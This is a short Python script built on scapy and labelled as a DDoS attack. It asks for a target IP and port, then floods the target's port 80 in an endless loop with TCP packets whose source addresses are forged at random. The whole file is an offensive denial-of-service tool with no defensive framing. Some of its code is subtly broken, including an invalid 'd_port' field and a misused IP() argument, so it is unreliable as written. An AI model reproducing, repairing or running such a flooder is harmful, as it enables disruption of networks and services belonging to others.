from scapy.all import *

#DDOS Attack to a Network

target_IP = input("Target IP:")

src_port = int(input("POrt:"))

i=1
while True:
    i1=str(random.randint(1,254))
    i2=str(random.randint(1,254))
    i3=str(random.randint(1,254))
    i4=str(random.randint(1,254))
    
    d = "."
    src_IP = i1+d+i2+d+i3+d+i4
    
    IP1 = IP(src_IP,dst = target_IP)
    TCP1 = TCP(sport = src_port,d_port = 80)
    pkt = IP1/TCP1
    
    send(pkt,inter = .001)
    
    print("packet Sent",i)
    i = i+1
